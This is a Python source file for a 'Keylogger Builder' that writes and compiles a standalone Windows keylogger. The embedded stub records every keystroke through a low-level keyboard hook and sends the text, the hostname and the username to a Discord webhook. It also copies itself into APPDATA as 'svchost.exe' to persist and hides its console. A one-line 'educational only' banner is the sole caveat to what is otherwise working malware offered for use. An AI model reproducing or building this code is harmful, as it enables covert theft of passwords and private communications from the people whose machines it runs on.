"""Keylogger Builder — Build standalone keylogger .exe with Discord webhook exfil."""

import os
import sys
import time
import subprocess

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

KEYLOGGER_STUB = r'''
import os, sys, time, ctypes, json, urllib.request, threading, subprocess, platform, shutil
from ctypes import wintypes, CFUNCTYPE, POINTER, c_int
from datetime import datetime

WEBHOOK = "{webhook}"
FLUSH_INTERVAL = {flush}
PERSIST = {persist}
STEALTH = {stealth}
DEBUG = {debug}

LOG = []
LOCK = threading.Lock()
DEBUG_LOG = []
DBG_LOCK = threading.Lock()

def dprint(msg):
    if DEBUG:
        ts = datetime.now().strftime('%H:%M:%S')
        line = f"[{{ts}}] {{msg}}"
        with DBG_LOCK:
            DEBUG_LOG.append(line)
        try:
            dbg_path = os.path.join(os.getenv("APPDATA", "."), "kl_debug.txt")
            with open(dbg_path, "a") as f:
                f.write(line + "\n")
        except: pass

def send_webhook(text):
    try:
        data = json.dumps({{"content": f"```\\n{{text}}\\n```"}}).encode()
        req = urllib.request.Request(WEBHOOK, data=data,
                                     headers={{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}})
        resp = urllib.request.urlopen(req, timeout=10)
        dprint(f"Webhook sent: {{resp.status}} ({{len(text)}} chars)")
    except Exception as e:
        dprint(f"Webhook error: {{e}}")

def get_log_path():
    return os.path.join(os.getenv("APPDATA", "."), "kl_log.txt")

def write_log(text):
    try:
        with open(get_log_path(), "a", encoding="utf-8") as f:
            f.write(text)
        dprint(f"Log written: {{len(text)}} chars to {{get_log_path()}}")
    except Exception as e:
        dprint(f"Log write error: {{e}}")

def flush_loop():
    dprint(f"Flush loop started (interval={{FLUSH_INTERVAL}}s)")
    while True:
        time.sleep(FLUSH_INTERVAL)
        with LOCK:
            batch = "".join(LOG[-500:])
            LOG.clear()
        if batch:
            write_log(batch)
            send_webhook(batch)
            dprint(f"Flushed {{len(batch)}} chars")

def persistence():
    if not PERSIST:
        dprint("Persistence disabled")
        return
    try:
        src = sys.argv[0]
        dst = os.path.join(os.getenv("APPDATA", "."), "svchost.exe")
        if src != dst and not os.path.isfile(dst):
            shutil.copy2(src, dst)
            subprocess.Popen([dst], creationflags=0x08000000)
            dprint(f"Persistence: copied to {{dst}}, relaunching")
            os._exit(0)
        elif os.path.isfile(dst):
            dprint("Persistence: already installed")
        else:
            dprint("Persistence: already running from install path")
    except Exception as e:
        dprint(f"Persistence error: {{e}}")

def proc(nCode, wp, lp):
    if nCode == 0:
        try:
            vkCode = ctypes.c_int.from_address(lp + 8).value
            flags = ctypes.c_int.from_address(lp + 12).value
            if not (flags & 0x80000000):
                key = ""
                if vkCode == 0x0D: key = " [ENTER] "
                elif vkCode == 0x09: key = " [TAB] "
                elif vkCode == 0x08: key = " [BKSP] "
                elif vkCode == 0x2E: key = " [DEL] "
                elif vkCode == 0x20: key = " "
                elif vkCode == 0x1B: key = " [ESC] "
                elif vkCode == 0x2C: key = " [PRTSC] "
                elif 48 <= vkCode <= 57:
                    shift = ctypes.windll.user32.GetKeyState(0x10) & 0x8000
                    if shift: key = ")!@#$%^&*("[vkCode-48]
                    else: key = chr(vkCode)
                elif 65 <= vkCode <= 90:
                    shift = ctypes.windll.user32.GetKeyState(0x10) & 0x8000
                    caps = ctypes.windll.user32.GetKeyState(0x14) & 1
                    key = chr(vkCode + 32)
                    if shift != caps: key = key.upper()
                elif 96 <= vkCode <= 105: key = str(vkCode - 96)
                elif vkCode == 106: key = "*"
                elif vkCode == 107: key = "+"
                elif vkCode == 109: key = "-"
                elif vkCode == 110: key = "."
                elif vkCode == 111: key = "/"
                elif vkCode == 0xC0: key = "~" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "`"
                elif vkCode == 0xBD: key = "_" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "-"
                elif vkCode == 0xBB: key = "+" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "="
                elif vkCode == 0xDB: key = "{{" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "["
                elif vkCode == 0xDD: key = "}}" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "]"
                elif vkCode == 0xDC: key = "|" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "\\"
                elif vkCode == 0xBE: key = ">" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "."
                elif vkCode == 0xBC: key = "<" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else ","
                elif vkCode == 0xBF: key = "?" if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "/"
                elif vkCode == 0xDE: key = '"' if (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) else "'"
                if key:
                    with LOCK: LOG.append(key)
                    dprint(f"Key: {{repr(key)}} (vk={{hex(vkCode)}})")
        except Exception as e:
            dprint(f"Proc error: {{e}}")
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wp, lp)

def main():
    dprint("=== KEYLOGGER STARTING ===")
    dprint(f"Webhook: {{WEBHOOK[:30]}}...")
    dprint(f"Flush: {{FLUSH_INTERVAL}}s | Persist: {{PERSIST}} | Stealth: {{STEALTH}}")
    persistence()
    send_webhook(f"[KEYLOG] Connected: {{platform.node()}} | {{os.getenv('USERNAME')}} | Debug: {{DEBUG}}")
    t = threading.Thread(target=flush_loop, daemon=True)
    t.start()
    cb = CFUNCTYPE(c_int, c_int, POINTER(ctypes.c_void_p), POINTER(ctypes.c_void_p))(proc)
    hook = ctypes.windll.user32.SetWindowsHookExW(13, cb, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
    dprint(f"Hook installed: {{hook}}")
    if not hook:
        dprint("FATAL: SetWindowsHookExW failed")
        return
    if STEALTH:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            dprint("Console hidden")
        except: dprint("Could not hide console")
    msg = wintypes.MSG()
    dprint("Entering message loop...")
    while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0):
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

if __name__ == "__main__":
    main()
'''

def _debug_print(title, msg):
    cprint(f"  \033[90m[DBG] {title}: {msg}\033[0m")

def run(kevbin=None):
    debug_mode = False
    while True:
        clear()
        dbg = " \033[91m[DEBUG]\033[0m" if debug_mode else ""
        cprint("  \033[93m\u2554" + "\u2550"*50 + "\u2557")
        cprint(f"  \033[93m\u2551       KEYLOGGER BUILDER{dbg}" + " "*(28-len(dbg)) + "\u2551")
        cprint("  \033[93m\u255a" + "\u2550"*50 + "\u255d")
        cprint("  \033[91m[!] Own machine / educational only\033[0m")
        print()
        cprint("  \033[97m[1]  Build Keylogger (.py)\033[0m")
        cprint("  \033[97m[2]  Build Keylogger (.exe)\033[0m")
        cprint("  \033[97m[3]  View Stub Source\033[0m")
        cprint("  \033[97m[4]  Toggle Debug Mode\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '4':
            debug_mode = not debug_mode
            state = "\033[92mON\033[0m" if debug_mode else "\033[91mOFF\033[0m"
            cprint(f"  Debug: {state}")
            time.sleep(0.5)
            continue
        elif choice in ('1', '2'):
            clear()
            cprint("  \033[93m\u2550"*54)
            cprint("  \033[93m  KEYLOGGER CONFIGURATION\033[0m")
            cprint("  \033[93m\u2550"*54)
            print()
            webhook = prompt("  \033[96mDiscord Webhook URL: \033[0m").strip()
            if not webhook or 'discord' not in webhook:
                cprint("  \033[91m[X] Need valid webhook URL\033[0m"); pause(); continue
            if debug_mode:
                _debug_print("WEBHOOK", webhook[:40] + "...")
            print()
            try:
                flush = int(prompt("  \033[96mFlush interval seconds (default 30): \033[0m").strip() or '30')
            except: flush = 30
            flush = max(5, flush)
            persist = prompt("  \033[96mEnable persistence? (y/n, default n): \033[0m").strip().lower() == 'y'
            stealth = prompt("  \033[96mHide console window? (y/n, default y): \033[0m").strip().lower() != 'n'
            print()
            if debug_mode:
                _debug_print("CONFIG", f"Flush={flush}s Persist={persist} Stealth={stealth} Debug={debug_mode}")
            stub = KEYLOGGER_STUB.format(
                webhook=webhook,
                flush=flush,
                persist=str(persist),
                stealth=str(stealth),
                debug=str(debug_mode)
            )
            out = prompt("  \033[96mOutput filename (default: keylogger.py): \033[0m").strip() or "keylogger.py"
            if not out.endswith('.py'): out += '.py'
            if debug_mode:
                _debug_print("STUB", f"Length: {len(stub)} bytes")
            with open(out, 'w', encoding='utf-8') as f:
                f.write(stub)
            fsize = os.path.getsize(out)
            cprint(f"  \033[92m[X] Saved: {out} ({fsize} bytes)\033[0m")
            if debug_mode:
                _debug_print("FILE", f"Path: {os.path.abspath(out)}")
            if choice == '2':
                exe_name = os.path.splitext(out)[0] + ".exe"
                if debug_mode:
                    _debug_print("BUILD", f"Target: dist/{exe_name}")
                    _debug_print("BUILD", f"Python: {sys.executable}")
                cprint("  \033[36m[*] Compiling with PyInstaller...\033[0m")
                try:
                    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile',
                           '--noconsole', '--clean', '--name', os.path.splitext(exe_name)[0], out]
                    if debug_mode:
                        _debug_print("CMD", " ".join(cmd))
                    result = subprocess.run(cmd, check=True, timeout=180,
                                           capture_output=debug_mode, text=debug_mode)
                    if debug_mode and result.stdout:
                        for line in result.stdout.strip().split('\n')[-8:]:
                            _debug_print("PYINST", line.strip())
                    dist_path = os.path.join("dist", exe_name)
                    if os.path.isfile(dist_path):
                        esize = os.path.getsize(dist_path)
                        cprint(f"  \033[92m[X] Built: {dist_path} ({esize:,} bytes)\033[0m")
                        if debug_mode:
                            _debug_print("DONE", f"Full: {os.path.abspath(dist_path)}")
                    else:
                        cprint(f"  \033[93m[?] Compiled but {dist_path} not found\033[0m")
                except FileNotFoundError:
                    cprint("  \033[91m[X] pip install pyinstaller\033[0m")
                except subprocess.TimeoutExpired:
                    cprint("  \033[91m[X] Build timed out (180s)\033[0m")
                except subprocess.CalledProcessError as e:
                    cprint(f"  \033[91m[X] Build failed: exit code {e.returncode}\033[0m")
                    if debug_mode and e.stderr:
                        for line in str(e.stderr).strip().split('\n')[-6:]:
                            _debug_print("ERR", line.strip())
                except Exception as e:
                    cprint(f"  \033[91m[X] Error: {e}\033[0m")
                    if debug_mode:
                        _debug_print("EXC", str(e))
        elif choice == '3':
            clear()
            stub = KEYLOGGER_STUB.format(webhook="WEBHOOK_URL_HERE", flush="30",
                                          persist="False", stealth="True", debug="False")
            print(stub)
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
